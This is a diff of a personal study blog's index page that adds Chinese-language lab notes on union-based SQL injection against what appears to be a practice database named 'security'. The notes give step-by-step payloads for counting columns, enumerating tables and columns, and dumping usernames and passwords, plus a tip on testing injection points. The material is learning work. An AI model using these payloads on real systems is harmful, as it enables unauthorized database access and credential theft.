@@ -71,6 +71,79 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-lab" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/19/lab/" class="article-date">
+  <time class="dt-published" datetime="2021-11-19T06:47:57.480Z" itemprop="datePublished">2021-11-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="lab"><a href="#lab" class="headerlink" title="lab"></a>lab</h1><p>?id=10’union select 1,table_name,3 from information_schema.tables where table_schema=’security’ limit 0,1 – qwe //一个一个地查表 </p>
+<p>?id=10’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+</p>
+<p>//一次查出全部的表但是可能因为显示位不够而漏掉一些内容</p>
+<p><img src="https://i.loli.net/2021/11/19/qPmFyh4n8TeJdkb.png"></p>
+<p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
+<p>1.<code>?id=1&#39;</code></p>
+<p>2.输入order by语句对字段进行猜测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
+
+<p>3.输入 <code>?id=-1&#39; union select 1,2,3, --+</code></p>
+<p>4,爆数据库（得到数据库名称security）<code>?id=-1&#39; union select 2,3, database() --+</code></p>
+<p>5,爆表名（得到表名users）<code>?id=-1&#39; union select 2,3,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39; --+</code></p>
+<p>6.爆列名（得到列名username，password…）<code>?id=-1&#39; union select 2,3, group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code></p>
+<p>7.查询内容 <code>?id=-1 union select 2,3, group_concat (username, &#39;:&#39;,password)from security.users --+</code></p>
+<p>2021 11 19 </p>
+<p>在实验室学习的一天</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wifi-0x.github.io/2021/11/19/lab/" data-id="ckw60twf8000150uy4sgt0gyo" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-mysql 的函数" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/" class="article-date">
+  <time class="dt-published" datetime="2021-11-16T15:15:58.833Z" itemprop="datePublished">2021-11-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="https://i.loli.net/2021/11/16/pTwogVcQKPFzJti.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wifi-0x.github.io/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/" data-id="ckw60twf6000050uyayty58hz" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-如何判断是字符型注入还是数字型注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/" class="article-date">
@@ -92,6 +165,11 @@
 </code></pre>
 <h1 id="union用法："><a href="#union用法：" class="headerlink" title="union用法："></a>union用法：</h1><p>UNION操作符用于合并两个或多个SELECT语句的结果集，而且UNION内部的SELECT语句必须拥<br>有相同数量的列，列也必须拥有相似的数据类型，同时，每条SELCCT语句中的列的顺序必须相同。<br>说白了，就是把两个表的结果拼接成为一个表，能够拼接的前提是两个表都用相同的列，你是3列，<br>我也是3列。<br>前面讲过我们要做的第一件事，是判断有多少列，主要目的就是为了使用union联合查询。<br>(因为要构造相同数量的列)</p>
 <h1 id="group-concat-用法："><a href="#group-concat-用法：" class="headerlink" title="group_concat()用法："></a>group_concat()用法：</h1><p>group_concat(id)              表示把id字段的值在同一行打印出来，逗号分隔(默认)<br>group_concat(‘<em>‘,id1,id2)   表示使用</em>进行分割，拼接id1和id2</p>
+<h1 id="判断是否存在注入点"><a href="#判断是否存在注入点" class="headerlink" title="判断是否存在注入点"></a>判断是否存在注入点</h1><p>使用+ 或 -</p>
+<p>id=1+1</p>
+<p>id=2-1</p>
+<p>当符号不能直接使用时用下面的网址进行<strong>转换</strong></p>
+<p><a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/urlencode.aspx">http://tool.chinaz.com/tools/urlencode.aspx</a></p>
 
       
     </div>
@@ -390,141 +468,6 @@
 
 
   
-    <article id="post-专业名称&amp;概念" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&%E6%A6%82%E5%BF%B5/" class="article-date">
-  <time class="dt-published" datetime="2021-10-24T15:54:07.579Z" itemprop="datePublished">2021-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="专业名词-amp-概念"><a href="#专业名词-amp-概念" class="headerlink" title="专业名词&amp;概念"></a>专业名词&amp;概念</h1><p>[TOC]</p>
-<h3 id="URL（网址）路径"><a href="#URL（网址）路径" class="headerlink" title="URL（网址）路径"></a>URL（网址）路径</h3><p>如：内卷的代价(<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4">https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4</a>)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符 (uniform resource locator, url) 是用于完整地描述internet上网页和其他资源的地址的一种标识方法。 internet上的每一个网页都具有一个唯一的名称标识，通常称之为url地址，这种地址可以是本地磁盘，也可以是局域网上的某一台计算机，更多的是internet上的站点。简单地说，url就是web地址，俗称“网址”。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（协议）：//（主机名）/（端口号）/（文件名）/（文件路径） </span><br><span class="line">有两种超文本传送协议格式 </span><br><span class="line">mms </span><br><span class="line">http </span><br><span class="line">而后面的拓展名 是根据文件的类型来定义的 </span><br><span class="line">详细格式为： </span><br><span class="line">&#123;协议&#125;：//&#123;用户名&#125;:&#123;密码&#125;@&#123;主机名&#125;:&#123;端口号&#125;/&#123;路径&#125;/&#123;文件&#125;?&#123;参数&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="静态页面："><a href="#静态页面：" class="headerlink" title="静态页面："></a>静态页面：</h3><p><em><strong>简单来说</strong></em><em>就是</em>**服务器不执行的页面</p>
-<p><strong>仔细地说就是</strong>无需经过服务器的编译，直接加载到客户浏览器上显示出来；占服务器空间，不能自主更新页面，每个网页都是一个独立的文件。静态页面一般是.html .shtml .htm 结尾，URL路径没有特殊符号如？% 等，无需加载后台程序 无需获取后台数据库，<u>用户只能在网页中浏览不能做任何的数据交换</u></p>
-<p><strong>优点：</strong></p>
-<p>1、访问速度快</p>
-<p>2、内容相对稳定，比较容易被搜索引擎检索</p>
-<p><strong>缺点：</strong></p>
-<p>1、无数据库的支持，在网站制作和维护方面工作量较大；</p>
-<p>2、交互性较差，在功能方面有较大的限制；</p>
-<h3 id="动态页面："><a href="#动态页面：" class="headerlink" title="动态页面："></a>动态页面：</h3><p><strong>简单来说</strong>服务器执行的页面</p>
-<p><strong>不简单地说</strong>动态页面一般指动态获取数据库查询，URL路径中包含特殊符号如 ？%等，例如淘宝网宝贝的筛选等。</p>
-<p><img src="https://i.loli.net/2021/10/25/K5z9M2gpfBXTNws.jpg"></p>
-<p>采用数据库的开发模式</p>
-<p><strong>优点：</strong></p>
-<p>1、可以实现更多的功能，如登录、注册、用户管理、订单管理等；</p>
-<p><strong>缺点：</strong></p>
-<p>1、在访问速度上不占优势</p>
-<p>先获得用户指令，然后网页拿着指令到数据库找和指令对应的数据，然后传递给服务器，通过服务器的编译生成html代码，最后传递给用户浏览器。</p>
-<p>这一过程需要几秒的时间，访问人数一多，加载速度就会变慢，对于服务器来说是一种负担；</p>
-<p>2、在搜索引擎收录方面不占优势</p>
-<p>动态页面是经过用户输入指令后才形成的页面，实际上并不存在这个页面；而搜索引擎只会抓取现成的。</p>
-<h3 id="html"><a href="#html" class="headerlink" title="html"></a><strong>html</strong></h3><p>html文件就是正常见到的网页格式的文件，一般这种文件到了电脑上之后，就会变成默认浏览器的图标，就是说这个文件会使用这个浏览器打开。</p>
-<p>　　HTML称为超文本标记语言，是一种标识性的语言。它包括一系列标签，通过这些标签可以<strong>将网络上的文档格式统一</strong>，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p>
-<h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>　　超文本*<u>是一种组织信息的方式</u>*，它<strong>通过超级链接方法将文本中的文字、图表与其他信息媒体相关联</strong>。这些相互关联的信息媒体可能在同一文本中，也可能是其他文件，或是地理位置相距遥远的某台计算机上的文件。这种组织信息方式将分布在不同位置的信息资源用随机方式进行连接，为人们查找，检索信息提供方便。</p>
-<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><img src="https://i.loli.net/2021/10/25/gU8E4OS9QzCyqeB.png"></p>
-<ul>
-<li><table>
-<thead>
-<tr>
-<th align="center">返回的状态码：</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">200表示成功</td>
-</tr>
-<tr>
-<td align="center">403访问被决绝</td>
-</tr>
-<tr>
-<td align="center">404页面没有找到</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<p><img src="https://i.loli.net/2021/10/25/U6ZuQnfAi439G1O.png"></p>
-<p><img src="https://i.loli.net/2021/10/25/tJaNsUYvG5fwZbx.png"></p>
-<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>就是一个名字</p>
-<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p><strong>CMS简单的说就是制作和管理网页用的一个工具软件</strong> 现在CMS建站系统非常的多 帝国、科讯等。<strong>就是内容管理系统..说的简单点..其实就是一个网站的整体模板。</strong>每种CMS的界面和操作规则都不太一样 基本都属于二次开发 让一些有基础但又称不上高手的人 用CMS建站系统建立并管理网站（代码多少得懂点）<br>注：基本上用CMS建立的网站都是在软件给出的效果中选择 不能随心所欲的设计（随心所欲的设计得是那些高手才行的 用CMS可以满足正常的建站要求）</p>
-<h3 id="客户端和服务器端"><a href="#客户端和服务器端" class="headerlink" title="客户端和服务器端"></a>客户端和服务器端</h3><p>客户端：浏览者</p>
-<p>服务器端：给浏览者提供</p>
-<p><img src="https://i.loli.net/2021/10/25/F5RWLd3Y8ZKrbpo.jpg"></p>
-<p><strong>红色方块</strong>为端口，里面的数字是端口号</p>
-<h3 id="BS架构和CS架构"><a href="#BS架构和CS架构" class="headerlink" title="BS架构和CS架构"></a>BS架构和CS架构</h3><p>网络系统软件开发包括B/S与C/S两种结构都可以进行同样的业务处理</p>
-<h4 id="BS-通过浏览器去访问服务器"><a href="#BS-通过浏览器去访问服务器" class="headerlink" title="**BS:**通过浏览器去访问服务器"></a>**BS:**通过浏览器去访问服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b:browser(浏览器)</span><br><span class="line">s：sever（服务器）</span><br></pre></td></tr></table></figure>
-
-<p>所以的web都是BS架构的</p>
-<p>特点：</p>
-<p>1 不需要下载特定的客户端（方便）</p>
-<p>2 和服务器进行HTTP协议</p>
-<p>3 它将所以的数据储存在服务器上</p>
-<p>优缺点：</p>
-<p>1.B/S结构维护升级更方便</p>
-<p>2.成本低，不用开发特定的客户端</p>
-<p>3.数据相对安全，因为已经储存在服务器上</p>
-<p>1，应用服务器运行数据复合较重</p>
-<h4 id="CS：特定的客户端（client-去连接服务器-server"><a href="#CS：特定的客户端（client-去连接服务器-server" class="headerlink" title="CS：特定的客户端（client)去连接服务器(server)"></a><strong>CS</strong>：特定的客户端（client)去连接服务器(server)</h4><p>如：王者荣耀     QQ</p>
-<p>特点：</p>
-<p>1 C/S软件通常需要特定的客户端来使用。</p>
-<p>2 可以通过任意协议进行通信。</p>
-<p>3 它的客户端有数据处理和存储的能力，可以把应用程序的计算和数据分配在客户端和服务器端。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&%E6%A6%82%E5%BF%B5/" data-id="ckw0rpwo20005rouyfglj7ekk" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-测试一下" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/" class="article-date">
-  <time class="dt-published" datetime="2021-10-24T03:02:57.893Z" itemprop="datePublished">2021-10-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>测试一下</p>
-<p><img src="https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/" data-id="ckw0rpwo40008rouyh6dcci8r" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -561,6 +504,14 @@
       <ul>
         
           <li>
+            <a href="/2021/11/19/lab/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/11/16/mysql%20%E7%9A%84%E5%87%BD%E6%95%B0/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/16/%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E8%BF%98%E6%98%AF%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5/">(no title)</a>
           </li>
         
@@ -570,14 +521,6 @@
         
           <li>
             <a href="/2021/11/09/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/04/November%204,2021/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2021/11/01/MYSQL/">(no title)</a>
           </li>
         
       </ul>
